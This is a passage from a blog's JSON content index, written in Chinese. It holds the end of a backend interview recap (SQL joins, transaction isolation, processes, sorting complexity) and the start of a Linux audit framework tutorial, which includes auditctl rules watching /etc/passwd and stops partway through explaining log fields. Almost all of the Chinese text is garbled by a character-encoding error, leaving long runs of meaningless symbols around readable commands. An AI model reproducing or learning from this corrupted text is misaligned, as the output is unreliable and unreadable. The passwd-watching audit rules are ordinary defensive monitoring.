å®Œå…¨æ²¡ç­”ä¸Šæ¥â€¦â€¦\nleft-joinå°±æ˜¯åœ¨ä¸¤ä¸ªè¡¨è¿›è¡Œç­›é€‰æ—¶ï¼Œå®Œå…¨ä¿ç•™å·¦è¡¨çš„å†…å®¹ï¼›\nright-joinåŒç†ï¼›\ninner-joinåˆ™åªä¿ç•™ä¸¤ä¸ªè¡¨ä¸­éƒ½åŒ¹é…çš„å†…å®¹ã€‚\nleft join,right join,inner join,full joinä¹‹é—´çš„åŒºåˆ« - lijingran - åšå®¢å›­ (cnblogs.com)\n8.2 éš”ç¦»çº§åˆ«ï¼Ÿ å¯ç®—æ˜¯è¢«æˆ‘è¹²åˆ°ä¸€ä¸ªä¼šçš„ã€‚\nè¯»æœªæäº¤ï¼šè¯»åˆ°å…¶ä»–äº‹åŠ¡è¿˜æ²¡æäº¤çš„æ•°æ®ï¼›\nè¯»å·²æäº¤ï¼šé¡¾åæ€ä¹‰ï¼›\nå¯é‡å¤è¯»\nä¸²è¡ŒåŒ–ã€‚\n8.3 éš”ç¦»çº§åˆ«çš„åŒºåˆ«ï¼Ÿ å…¶å®éš”ç¦»çº§åˆ«æ¥æºäºæ•°æ®åº“å¹¶è¡Œå¤„ç†äº‹åŠ¡æ—¶ä¼šå‘ç”Ÿçš„é—®é¢˜ã€‚\nå¦‚è„å†™ã€è„è¯»ã€ä¸å¯é‡å¤è¯»ã€å¹»è¯»ã€‚\nå¹»è¯»å’Œä¸å¯é‡å¤è¯»çš„åŒºåˆ«ï¼Ÿ\nä¸å¯é‡å¤è¯»æ˜¯é’ˆå¯¹æŸä¸ªç¡®å®šæ•°æ®ï¼Œè€Œå¹»è¯»å¯èƒ½æ˜¯é’ˆå¯¹ä¸ç¡®å®šçš„å¤šè¡Œæ•°æ®ã€‚\nä¾‹å¦‚ï¼Œé¢ï¼Œé¢ï¼Œâ€¦â€¦ï¼ˆå¿˜äº†ï¼‰\næ­£è§£ï¼šæ•°æ®åº“äº‹åŠ¡çš„æ¦‚å¿µåŠå…¶å®ç°åŸç† - takumiCX - åšå®¢å›­ (cnblogs.com)\n9 è¯´ä¸€ä¸‹ fd=fopen() è¿™ä¸ªæŒ‡ä»¤åœ¨ç³»ç»Ÿä¸­çš„å…·ä½“æµç¨‹ï¼Ÿ å¼€å§‹äº†æ“ä½œç³»ç»Ÿéƒ¨åˆ†ã€‚\næ–‡ä»¶çš„è¯»æ“ä½œï¼Œå°±æ˜¯å‘ç›®æ ‡æ–‡ä»¶çš„çœŸå®è®¾å¤‡ä¸Šå‘é€ä¸€ä¸ªIOè¯·æ±‚ï¼Œè¿™ä¸ªIOè¯·æ±‚ç»è¿‡ç»‘å®šåœ¨è¿™ä¸ªè®¾å¤‡ä¸Šçš„å¤šä¸ªè®¾å¤‡ï¼ˆè®¾å¤‡æ ˆï¼‰ä¹‹åï¼Œåˆ°è¾¾æ–‡ä»¶é©±åŠ¨ï¼Œç„¶åæŠŠæ–‡ä»¶è¯»å–å‡ºæ¥ï¼Œè¿”å›ã€‚\nè¿˜æœ‰å—ï¼Ÿ\næ²¡äº†â€¦â€¦\nåæ¥å‘ç°ä»–æƒ³é—®çš„å¯èƒ½ä¸æ˜¯é©±åŠ¨ï¼Œè€Œæ˜¯APIè°ƒç”¨çš„æ•´ä¸ªè¿‡ç¨‹ï¼ˆä¸­æ–­ï¼Œä¿å­˜ç°åœºï¼Œç³»ç»Ÿè°ƒç”¨ï¼Œè¿”å›æ–‡ä»¶æŒ‡é’ˆç­‰ï¼‰ã€‚\n10 å­¤å„¿è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹ï¼Ÿ å­¤å„¿è¿›ç¨‹å°±æ˜¯æŒ‡çˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹åï¼Œçˆ¶è¿›ç¨‹å…ˆæ­»äº¡ï¼Œç„¶åå­è¿›ç¨‹å°±å˜æˆäº†å­¤å„¿è¿›ç¨‹ã€‚å­¤å„¿è¿›ç¨‹ä¸€èˆ¬ç”± init è¿›ç¨‹æ¥ç®¡ï¼Œä¼šå»è°ƒç”¨ wait æ–¹æ³•æ¥å›æ”¶è¿™äº›è¿›ç¨‹ã€‚\nåƒµå°¸è¿›ç¨‹æ˜¯æŒ‡çˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹åï¼Œä¸å»ç®¡è¿™äº›å­è¿›ç¨‹äº†ã€‚å½“å­è¿›ç¨‹ç»“æŸä¹‹åï¼Œæœ¬æ¥åº”è¯¥ç”±çˆ¶è¿›ç¨‹è¿›è¡Œå›æ”¶ï¼Œä½†çˆ¶è¿›ç¨‹ä¸ç®¡å®ƒä»¬äº†ï¼Œå°±ä½¿å¾—è¿™äº›å­è¿›ç¨‹çš„èµ„æºåœç•™åœ¨ç³»ç»Ÿä¸­ã€‚\nå­¤å„¿è¿›ç¨‹ä¸åƒµå°¸è¿›ç¨‹[æ€»ç»“] - Rabbit_Dale - åšå®¢å›­ (cnblogs.com)\n11 è¿›ç¨‹åˆ‡æ¢ä¸Šä¸‹æ–‡ï¼Ÿ ä¿å­˜ä¸€äº›å¯„å­˜å™¨çš„å€¼ï¼ˆESPã€EIPã€EBPç­‰ï¼‰ã€‚\näº§ç”Ÿç³»ç»Ÿæ ˆã€CPUç­‰çš„å¼€é”€ã€‚\n12 å†’æ³¡ã€å¿«æ’ã€å½’å¹¶çš„æœ€å¥½æœ€åæ—¶é—´å¤æ‚åº¦ï¼Ÿ å†’æ³¡åº”è¯¥éƒ½æ˜¯ O(n^2) ï¼Ÿå› ä¸ºéƒ½è¦è¿›è¡Œå†’æ³¡ã€‚\nå½’å¹¶åº”è¯¥éƒ½æ˜¯ O(nlogn) ï¼Ÿå› ä¸ºåªéœ€è¦è¿›è¡Œå½’å¹¶ã€‚\nå¿«æ’è®°ä¸æ¸…äº†ï¼Œæœ€åæ˜¯ O(n^2) ï¼Œå…·ä½“åœºæ™¯å¿˜è®°ã€‚\næ­£è§£ï¼š\nå†’æ³¡æœ€ä¼˜ O(n) ï¼æ²ƒæ—¥ã€‚\nå½’å¹¶éƒ½æ˜¯ O(nlogn) æ²¡æ¯›ç—…ã€‚\nå¿«æ’æœ€ä¼˜ O(nlogn) ï¼Œæœ€å O(n^2) ã€‚\nå†’æ³¡æœ€ä¼˜çš„æƒ…å†µéœ€è¦å¯¹ä»£ç è¿›è¡Œä¼˜åŒ–ï¼Œå¦‚æœæŸæ¬¡å†’æ³¡çš„æ—¶å€™æ²¡æœ‰è¿›è¡Œäº¤æ¢ï¼Œè¯´æ˜å·²ç»æœ‰åºï¼Œç›´æ¥è¿”å› ï¼ˆå†’æ³¡æ’åºçš„æœ€ä¼˜æ—¶é—´å¤æ‚åº¦_å°å›å­çš„åšå®¢-CSDNåšå®¢_å†’æ³¡æ’åºæœ€ä¼˜æ—¶é—´å¤æ‚åº¦ï¼‰ã€‚\nå¿«æ’æœ€ä¼˜æœ€åçš„åˆ†æè§ ï¼ˆå¿«é€Ÿæ’åºæœ€å¥½ï¼Œæœ€åï¼Œå¹³å‡å¤æ‚åº¦åˆ†æ_weshjinessçš„ä¸“æ -CSDNåšå®¢_å¿«æ’å¤æ‚åº¦ï¼‰ã€‚\nè¿˜æœ‰ï¼Œè¿™ä¸ªè¡¨ä¸é”™ï¼š å¸¸è§æ’åºçš„æœ€å¥½ï¼Œå¹³å‡ä»¥åŠæœ€åæ—¶é—´å¤æ‚åº¦_JohnieLiçš„åšå®¢-CSDNåšå®¢_æ’åºæœ€å¥½æœ€åæ—¶é—´å¤æ‚åº¦\n13 ä»£ç é¢˜ï¼šä¹‹å­—å½¢æ‰“å°Nå‰æ ‘ å¦‚å›¾æ‰€ç¤ºï¼Œä¹‹å­—å½¢æ‰“å°Nå‰æ ‘ã€‚\né¢˜ç›® æˆ‘ä½¿ç”¨äº†ä¸¤ä¸ªæ ˆæ¥å±‚åºéå†ã€‚ä»å·¦åˆ°å³å°†å­èŠ‚ç‚¹å…¥æ ˆï¼Œä¸‹ä¸€å±‚å°±ä»å³åˆ°å·¦è¾“å‡ºï¼›åä¹‹äº¦ç„¶ã€‚\né—®é¢˜åœ¨äºï¼šå¦‚ä½•å°†å­èŠ‚ç‚¹ ä»å³åˆ°å·¦ å…¥æ ˆå‘¢ï¼Ÿ\nè·Ÿé¢è¯•å®˜èŠäº†èŠï¼Œä»–è¯´å¯ä»¥å…ˆè€ƒè™‘å®ç°ä¸Šçš„æ–¹ä¾¿ï¼Œé‚£æˆ‘å°±ç”¨ä¸€ä¸ª vector æ¥ä¿å­˜å­èŠ‚ç‚¹ï¼Œä»å·¦åˆ°å³éå†æˆ–ä»å³åˆ°å·¦éå†éƒ½è¡Œã€‚\nå®é™…ä¸Šå¦‚æœä½¿ç”¨æŒ‡é’ˆæ¥ä¿å­˜å­èŠ‚ç‚¹ï¼Œä¼°è®¡è¿˜å¾—å¼€ä¸€ä¸ªä¸´æ—¶ vector æ¥å­˜æ‰€æœ‰å­èŠ‚ç‚¹ï¼Œç„¶åå†ä»å³åˆ°å·¦å…¥æ ˆã€‚\n","date":"2021-08-28T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%AD%97%E8%8A%82%E5%90%8E%E7%AB%AF%E9%9D%A2%E7%BB%8F/","title":"å­—èŠ‚åç«¯é¢ç»"},{"content":"ä»€ä¹ˆæ˜¯audit Linuxä¸‹çš„auditæ¡†æ¶æä¾›å¯é çš„æœé›†ç³»ç»Ÿä¿¡æ¯çš„æœåŠ¡ï¼Œä»»ä½•ä¸å®‰å…¨ç›¸å…³ï¼ˆæˆ–æ— å…³ï¼‰çš„äº‹ä»¶éƒ½å¯è¢«æ­¤æ¡†æ¶æœé›†å’Œå®¡è®¡ã€‚é€šè¿‡auditï¼Œäººä»¬å¯ä»¥æ›´åŠ è¯¦ç»†åœ°äº†è§£ç³»ç»Ÿä¸Šå‘ç”Ÿçš„äº‹æƒ…ï¼Œç„¶è€Œï¼Œè¯¥æ¡†æ¶å¹¶ä¸æä¾›é¢å¤–çš„å®‰å…¨æªæ–½ï¼Œåœ¨å®‰å…¨äº‹ä»¶ä¸­ï¼Œå®ƒä»…ä»…æ˜¯å¸®åŠ©äººä»¬æ›´åŠ æ¸…æ™°åœ°è®¤è¯†æ•´ä¸ªäº‹ä»¶çš„å§‹æœ«ï¼Œæ­¤åäº¡ç¾Šè¡¥ç‰¢ï¼Œä¸ºæ—¶æœªæ™šã€‚\nç®€å•åœ°è¯´ï¼Œauditå®¡è®¡æ¡†æ¶çš„å·¥ä½œå°±æ˜¯ç›‘å¬æ¥è‡ªå†…æ ¸çš„äº‹ä»¶æŠ¥å‘Šï¼Œå¹¶å°†å®ƒä»¬å†™å…¥æ—¥å¿—æ–‡ä»¶ä¸­ã€‚\nè€Œè¾ƒä¸ºç³»ç»Ÿåœ°è¯´ï¼Œauditæ¡†æ¶çš„ç»„ä»¶ç»“æ„å¦‚å›¾æ‰€ç¤ºï¼š\nimg å®‰è£… å†…æ ¸å±‚çš„auditæœåŠ¡åœ¨Linuxï¼ˆ4.18åŠä»¥åï¼‰ã€Linux-ltsï¼ˆ4.19åŠä»¥åï¼‰ã€Linux-zenï¼ˆ4.18åŠä»¥åï¼‰å’ŒLinux-hardenedç­‰ç‰ˆæœ¬ä¸­é»˜è®¤å¯ç”¨ã€‚å¦‚ç”¨æˆ·ä½¿ç”¨è‡ªè¡Œç¼–è¯‘çš„å†…æ ¸ï¼Œéœ€è¦åœ¨ç¼–è¯‘ä¸­è®¾ç½®å‚æ•° CONFIG_AUDIT ã€‚\næˆ‘ä»¬é€šè¿‡æŸ¥çœ‹å†…æ ¸ç¼–è¯‘å‚æ•°ï¼Œå¯ä»¥çœ‹åˆ°ç³»ç»Ÿå¯¹auditå†…æ ¸å®¡è®¡çš„æ”¯æŒæƒ…å†µï¼Œä»¥CentOS 7ä¸ºä¾‹ï¼š\nimg ç”¨æˆ·å±‚çš„auditæœåŠ¡å¯ä»¥é€šè¿‡æ™®é€šçš„è½¯ä»¶å®‰è£…æ–¹å¼è·å–ï¼Œå¯ä»¥ä½¿ç”¨ systemctl æˆ– service å‘½ä»¤æ¥æ§åˆ¶æœåŠ¡çš„å¯åœã€‚\nauditå†…æ ¸å®¡è®¡çš„æ¶ˆæ¯å¯ä»¥ç”±åº”ç”¨æˆ–ç³»ç»Ÿæ´»åŠ¨æ¥è§¦å‘ï¼Œè€Œ audit daemonï¼ˆauditå®ˆæŠ¤è¿›ç¨‹ï¼‰ æ˜¯auditæ¡†æ¶ä¸­çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå®ƒè´Ÿè´£å¤„ç†å†…æ ¸ç”Ÿæˆçš„æ¶ˆæ¯ï¼Œä¾‹å¦‚å°†è¿™äº›æ¶ˆæ¯å†™å…¥æ—¥å¿—ä¸­æˆ–é€‰æ‹©æ€§åœ°å¿½ç•¥ã€‚\næˆ‘ä»¬å¯ä»¥é€šè¿‡è‹¥å¹²å‘½ä»¤å’Œæ–‡ä»¶æ¥æ§åˆ¶ audit daemon ï¼š\nauditctl ï¼šç›´æ¥æ§åˆ¶å®ˆæŠ¤è¿›ç¨‹çš„è¡Œä¸ºï¼Œå¦‚æ·»åŠ è§„åˆ™ç­‰ï¼› /etc/audit/audit.rules ï¼šå†…å«auditå®ˆæŠ¤è¿›ç¨‹çš„è§„åˆ™å’Œå„ç§å˜é‡ï¼› aureport ï¼šç”Ÿæˆç³»ç»Ÿæ´»åŠ¨çš„å®¡è®¡æŠ¥å‘Šï¼› ausearch ï¼šåœ¨å®¡è®¡æ—¥å¿—ä¸­å¯¹å„ç±»äº‹ä»¶è¿›è¡Œæœç´¢ï¼› auditspd ï¼šç”¨äºå°†äº‹ä»¶æ¶ˆæ¯é€šçŸ¥ç»™å…¶ä»–åº”ç”¨çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œæœ‰äº†æ­¤è¿›ç¨‹ï¼Œäº‹ä»¶å°±ä¸éœ€è¦é€šè¿‡ç£ç›˜ä¸Šçš„auditæ—¥å¿—æ¥è¿›è¡Œä¼ é€’äº†ï¼› autrace ï¼šç”¨äºè¿½è¸ªæŸä¸€è¿›ç¨‹çš„å‘½ä»¤ï¼Œç±»ä¼¼ strace ï¼› etc/audit/auditd.conf ï¼šå…³äºæ—¥å¿—è®°å½•çš„é…ç½®æ–‡ä»¶ã€‚ æ·»åŠ è§„åˆ™ åŸºç¡€ æ³¨æ„ï¼Œauditæ¡†æ¶å¯¹äº‹ä»¶çš„å®¡è®¡æ˜¯å…¨é¢è€Œç»†è‡´çš„ï¼Œæ·»åŠ è§„åˆ™ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å¯¹è§„åˆ™æœ‰å……åˆ†çš„è®¤çŸ¥ï¼Œå¦åˆ™ï¼Œå¯èƒ½ä»…ä»…ç”±äºä¸€æ¡è§„åˆ™ï¼Œæˆ‘ä»¬çš„æ—¥å¿—æ–‡ä»¶å°±è¢«ç¬é—´å†™æ»¡äº†ã€‚\nauditè§„åˆ™çš„åŠ è½½å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œå·¥å…· auditctl æˆ–ä½¿ç”¨å‘½ä»¤ auditctl -R /etc/audit/audit.rules ä»è§„åˆ™æ–‡ä»¶ä¸­æ‰¹é‡è¯»å–ã€‚\né€šè¿‡ auditctl å‘½ä»¤æ·»åŠ çš„è§„åˆ™ä¼šåœ¨ç³»ç»Ÿé‡å¯ä¹‹åä¸¢å¤±ã€‚å¦‚å¸Œæœ›ä½¿è§„åˆ™æŒç»­ç”Ÿæ•ˆï¼Œå°±å°†å®ƒä»¬å†™å…¥ /etc/audit/audit.rules æ–‡ä»¶ä¸­ï¼Œé€šè¿‡å‘½ä»¤ rcauditd resatrt é‡å¯auditæœåŠ¡ä½¿è§„åˆ™æ–‡ä»¶ç”Ÿæ•ˆã€‚\nå¯¹æ–‡ä»¶å’Œç›®å½•è®¿é—®çš„å®¡è®¡\nç›‘æ§æŸä¸€ç‰¹å®šæ–‡ä»¶çš„è®¿é—®è¡Œä¸ºå±äºauditæ¡†æ¶çš„åŸºç¡€ç”¨æ³•ã€‚ä½¿ç”¨ -w é€‰é¡¹ï¼ˆè¡¨ç¤ºâ€watchâ€œï¼‰æ¥æŒ‡å®šä½ è¦ç›‘æ§çš„æ–‡ä»¶æˆ–ç›®å½•ã€‚æœ€å¸¸è§çš„è§„åˆ™æ˜¯ç›‘æ§å¯¹ passwd æ–‡ä»¶çš„è®¿é—®ï¼š\n# auditctl -w /etc/passwd -p rwxa ä¹Ÿå¯ä»¥ç›‘æ§å¯¹æŸä¸€è·¯å¾„çš„è®¿é—®ï¼š\n# auditctl -w /etc/security/ ä¸Šé¢ç»™å‡ºçš„ç¬¬ä¸€æ¡è§„åˆ™ç›‘æ§äº†å¯¹ etc/passwd æ–‡ä»¶çš„æ‰€æœ‰è¯»æ“ä½œ r ã€å†™æ“ä½œ w ã€æ‰§è¡Œ x å’Œå±æ€§å˜æ›´æ“ä½œ a ï¼Œæ­¤ç±»è§„åˆ™æŒ‡å®šçš„æ–‡ä»¶éœ€è¦äº‹å…ˆå­˜åœ¨ï¼›\nç¬¬äºŒæ¡è§„åˆ™ç›‘æ§äº†å¯¹ etc/security ç›®å½•çš„æ‰€æœ‰è®¿é—®ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œç›®å½•ç›¸å…³çš„è§„åˆ™åªè®°å½•è¿™ä¸€ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ›å»º/åˆ é™¤ï¼Œå¸Œæœ›å¯¹å…¶ä¸‹çš„æ–‡ä»¶è¿›è¡Œè¿›ä¸€æ­¥çš„ç›‘æ§ï¼Œå°±ä½¿ç”¨ç¬¬ä¸€æ¡è§„åˆ™æ¥æŒ‡å®šå…·ä½“æ–‡ä»¶ã€‚\nå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹æ‰€æœ‰å¤„äºæ´»åŠ¨çŠ¶æ€çš„è§„åˆ™ï¼š\n# auditctl -l å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥åˆ é™¤ æ‰€æœ‰ è§„åˆ™ï¼š\n# auditctl -D å½“ç¡®è®¤è§„åˆ™æ— è¯¯ä¹‹åï¼Œå¯ä»¥å°†å®ƒä»¬æ·»åŠ åˆ° /etc/audit/audit.rules æ–‡ä»¶æœ«å°¾ï¼š\n-w /etc/passwd -p rwxa -w /etc/security/ å¯¹ç³»ç»Ÿè°ƒç”¨çš„å®¡è®¡ é€šè¿‡ -a é€‰é¡¹å¯ä»¥å¯¹ç³»ç»Ÿè°ƒç”¨è¿›è¡Œå®¡è®¡ã€‚\nä¾‹å¦‚ï¼Œå¯¹ chmod è°ƒç”¨è¿›è¡Œå®¡è®¡ï¼Œä»¥æ£€æµ‹æ–‡ä»¶å±ä¸»çš„å˜æ›´ï¼š\n# auditctl -a entry,always -S chmod å¯ä»¥é€šè¿‡ syscalls é¡µé¢æ‰¾åˆ°æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨ã€‚\nå¯¹ç³»ç»Ÿè°ƒç”¨è¿›è¡Œå®¡è®¡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ -F æ¥æ·»åŠ å¯¹æŸä¸ªé”®å€¼çš„ç­›é€‰ï¼Œä¾‹å¦‚ï¼š\n# å®¡è®¡æ‰€æœ‰ç¬¬äºŒä¸ªå‚æ•°ä¸º 4 çš„ access è°ƒç”¨ -a entry,always -S access -F a1=4 # å®¡è®¡æ‰€æœ‰ä¸æˆåŠŸçš„ open è°ƒç”¨ -a exit,always -S open -F success!=0 ä¸‹é¢è¿™æ¡è§„åˆ™ä¹Ÿä½¿ç”¨äº† -F é€‰é¡¹ï¼Œä½†æ˜¯å®ƒçš„å®¡è®¡å†…å®¹è¾ƒä¸ºç‰¹æ®Šï¼š\n-a task,always -F auid=0 å½“ä¸€ä¸ªè¿›ç¨‹è¢«åˆ›å»ºæˆ–å…‹éš†æ—¶ï¼Œ task è§„åˆ™å°±èµ·ä½œç”¨äº†ã€‚åœ¨ä¸Šé¢è¿™æ¡ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†é€‰ä¸­æ‰€æœ‰å…·å¤‡ auid=0 çš„ä»»åŠ¡ï¼Œå¹¶åœ¨å®ƒä»¬å‘ç”Ÿæ—¶è¿›è¡Œè®°å½•ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½ä¼šåœ¨ç”¨æˆ·ç™»å½•æ—¶è¢«èµ‹äºˆä¸€ä¸ª audit ID ï¼Œè¿™ä¸€IDä¸éšç€ç”¨æˆ·èº«ä»½çš„æ”¹å˜è€Œæ”¹å˜ï¼Œä¸”å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹çš„ auid ï¼Œé€šè¿‡è¿™ä¸ªIDæˆ‘ä»¬å¯ä»¥å”¯ä¸€ç¡®å®šåŸå§‹ç”¨æˆ·ã€‚\nå¯¹æ— ç”¨æ¶ˆæ¯çš„è¿‡æ»¤ åœ¨æ—¥å¿—è®°å½•è¿‡ç¨‹ä¸­ï¼Œæœ‰å¿…è¦é¿å…å¯¹ä¸é‡è¦çš„æ¶ˆæ¯è¿›è¡Œè®°å½•ï¼Œä»è€Œæ—¢æ–¹ä¾¿æˆ‘ä»¬å¯¹æ—¥å¿—è¿›è¡Œåˆ†æï¼Œä¹Ÿå‡å°æ—¥å¿—æ–‡ä»¶çš„ä½“ç§¯ã€‚\nå¯ä»¥æ·»åŠ å¦‚ä¸‹å½¢å¼çš„è§„åˆ™æ¥å¯¹éƒ¨åˆ†æ¶ˆæ¯è¿›è¡Œè¿‡æ»¤ï¼š\n# ä»¥ä¸‹è§„åˆ™æ·»åŠ åœ¨ /etc/audit/rules.d/quiet.rules æ–‡ä»¶ä¸­ --- -A exclude,always -F msgtype=SERVICE_START -A exclude,always -F msgtype=SERVICE_STOP -A exclude,always -F msgtype=BPF audit æ—¥å¿— æ—¥å¿—çš„åŸºæœ¬æ ¼å¼ é»˜è®¤æƒ…å†µä¸‹ï¼Œauditæ—¥å¿—å­˜æ”¾åœ¨ /var/log/audit ç›®å½•ä¸‹ã€‚ä¸‹é¢å…ˆçœ‹ä¸€æ¡å…¸å‹çš„auditæ—¥å¿—ç¤ºä¾‹ï¼š\n# å‘½ä»¤æ‰§è¡Œå®¡è®¡ type=SYSCALL msg=audit(1234874638.599:5207): arch=c000003e syscall=2 success=yes exit=4 a0=62fb60 a1=0 a2=31 a3=0 items=1 ppid=25400 pid =25616 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts1 ses=1164 comm=\u0026#34;less\u0026#34; exe=\u0026#34;/usr/bin/less\u0026#34; key=\u0026#34;doc_log\u0026#34; type=CWD msg=audit(1234874638.599:5207): cwd=\u0026#34;/root\u0026#34; type=PATH msg=audit(1234874638.599:5207): item=0 name=\u0026#34;/var/log/audit/audit.log\u0026#34; inode=1219041 dev=08:06 mode=0100644 ouid=0 ogid=0 rdev=00:00 è¿™æ˜¯æ‰§è¡Œäº†å‘½ä»¤ less /var/log/audit/audit.log ä¹‹åå¾—åˆ°çš„æ—¥å¿—ï¼Œaudité€šè¿‡ä¸€äº‹ä»¶äº§ç”Ÿäº† ä¸‰æ¡ æ¶ˆæ¯ï¼Œè¿™ä¸‰æ¡æ¶ˆæ¯ç´§å¯†è”ç³»ï¼Œå•ç‹¬æ‹å‡ºä»»ä½•ä¸€æ¡æ¥çœ‹éƒ½æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚\næˆ‘ä»¬é€ä¸€è§£é‡Šè¿™äº›æ—¥å¿—ä¸­çš„å­—æ®µã€‚é¦–å…ˆæ˜¯ç¬¬ä¸€æ¡æ—¥å¿—ï¼Œå®ƒå‘ˆç°äº†å¦‚ä¸‹çš„ä¿¡æ¯ï¼š\ntype ï¼šäº‹ä»¶çš„ç±»å‹ã€‚ç¬¬ä¸€æ¡æ¶ˆæ¯ä¸­çš„ type=SYSCALL è¡¨æ˜è¿™ä¸€æ¶ˆæ¯æ˜¯ç”±ç³»ç»Ÿè°ƒç”¨è§¦å‘ï¼› CWD è¡¨æ˜è¿™ä¸€æ¶ˆæ¯è®°å½•äº†å‘½ä»¤æ‰§è¡Œæ—¶çš„å·¥ä½œç›®å½•ï¼ˆcurrent working directoryï¼‰ï¼› PATH æ¶ˆæ¯è®°å½•äº†ä¼ é€’ç»™ç³»ç»Ÿè°ƒç”¨çš„è·¯å¾„ã€‚æ³¨æ„ï¼Œ PATH æ¶ˆæ¯ä»…ä»…æ˜¯å¿ å®åœ°è®°å½•äº†å‘½ä»¤æ‰§è¡Œæ—¶ä¼ é€’çš„è·¯å¾„å‚æ•°ï¼Œå¯¹äºä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼Œæˆ‘ä»¬éœ€è¦ç»“åˆ CWD æ¥åˆ†æå‡ºç»å¯¹è·¯å¾„ã€‚\nmsg ï¼šåŒ…è£¹åœ¨å°æ‹¬å·ä¹‹é—´çš„å†…å®¹ï¼Œè¡¨ç¤ºæ¶ˆæ¯IDã€‚å®ƒç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå†’å· : å‰çš„éƒ¨åˆ†æ˜¯UNIXæ—¶é—´æˆ³ï¼Œå†’å·åçš„éƒ¨åˆ†æ˜¯çœŸå®çš„äº‹ä»¶IDã€‚åŒä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è§¦å‘çš„æ‰€æœ‰æ¶ˆæ¯éƒ½å…·å¤‡ç›¸åŒçš„IDï¼Œä¾¿äºæˆ‘ä»¬è¿›è¡Œå…³è”åˆ†æã€‚\narch ï¼šæ‰§è¡Œç³»ç»Ÿè°ƒç”¨çš„CPUæ¶æ„ã€‚åœ¨ä½¿ç”¨ ausearch å‘½ä»¤æœå¯»æ—¥å¿—æ—¶ï¼ˆä¸‹æ–‡ä¼šæåˆ°ï¼‰ï¼Œä½¿ç”¨ -i é€‰é¡¹æ¥è§£ç è¿™ä¸€å­—æ®µçš„å€¼ã€‚\nsyscall ï¼šè®°å½•äº†ç³»ç»Ÿè°ƒç”¨çš„ç¼–å·ï¼Œä¸€èˆ¬ä» /usr/include/asm/unistd.h æ–‡ä»¶ä¸­å¾—å‡ºï¼Œä¹Ÿå› æ­¤å¯èƒ½éšç€æ¶æ„çš„ä¸åŒè€Œæ”¹å˜ã€‚æœ¬ä¾‹ä¸­ï¼Œ syscall=2 è¡¨ç¤º less ç¨‹åºæ‰€ä½¿ç”¨çš„ open ç³»ç»Ÿè°ƒç”¨ã€‚\nsuccess ï¼šäº‹ä»¶æ˜¯å¦æˆåŠŸã€‚\nexit ï¼šç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼ï¼Œéšç€ä¸åŒç³»ç»Ÿè°ƒç”¨çš„å®ç°è€Œæ”¹å˜ã€‚\na0~a3 ï¼šç³»ç»Ÿè°ƒç”¨çš„å‰å››ä¸ªå‚æ•°ï¼Œä»¥æ•°å­—å½¢å¼å‘ˆç°ã€‚è¿™äº›å€¼ä¹Ÿä¼šéšç€ä¸åŒç³»ç»Ÿè°ƒç”¨çš„å®ç°è€Œä¸åŒã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬è®°å½•åˆ°å¦‚ä¸‹çš„å€¼ï¼š\na0=62fb60 # æ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²çš„åœ°å€ a1=0 # æ ‡å¿—ä½ a2=31 # å·¥ä½œæ¨¡å¼ a3=0\t# æœªä½¿ç”¨ items ï¼šä¼ é€’ç»™æœ¬åº”ç”¨çš„å­—ç¬¦ä¸²ä¸ªæ•°ã€‚\nppid ï¼šçˆ¶è¿›ç¨‹IDã€‚\npid ï¼šè¿›ç¨‹IDã€‚\nauid ï¼šåœ¨ å¯¹ç³»ç»Ÿè°ƒç”¨çš„å®¡è®¡ ä¸€èŠ‚ä¸­æè¿‡çš„ audit ID ï¼Œå¯ä»¥ä½œä¸ºç”¨æˆ·çš„æ ‡è¯†ã€‚\nuid ï¼šå¯åŠ¨æœ¬è¿›ç¨‹çš„ç”¨æˆ·IDï¼Œ 0 è¡¨ç¤ºrootç”¨æˆ·ã€‚\ngid ï¼šå¯åŠ¨æœ¬è¿›ç¨‹çš„ç”¨æˆ·ç»„IDã€‚\neuidï¼Œsuidï¼Œfsuidï¼Œegidï¼Œsgidï¼Œfsgid ï¼šç•¥ã€‚\ntty ï¼šåº”ç”¨å¯åŠ¨æ—¶ä½¿ç”¨çš„ç»ˆç«¯ï¼Œæœ¬ä¾‹ä¸­ä½¿ç”¨äº†ä¸€ä¸ª ä¼ªç»ˆç«¯ï¼ˆpseudoterminalï¼‰ ã€‚\nses ï¼šç™»å½•ä¼šè¯IDã€‚ç”¨æˆ·ç™»å½•æ—¶å°†ä¸ºè¿™ä¸€å±æ€§èµ‹å€¼ï¼Œå¯ä»¥ç”¨äºå°†è¿›ç¨‹æ´»åŠ¨ä¸æŸä¸€æ¬¡ç™»å½•äº‹ä»¶è”ç³»èµ·æ¥ã€‚\ncomm ï¼šä»»åŠ¡åˆ—è¡¨ä¸­å‘ˆç°çš„åº”ç”¨åç§°ã€‚\nexe ï¼šè§£æå¾—åˆ°çš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ã€‚\nsubj 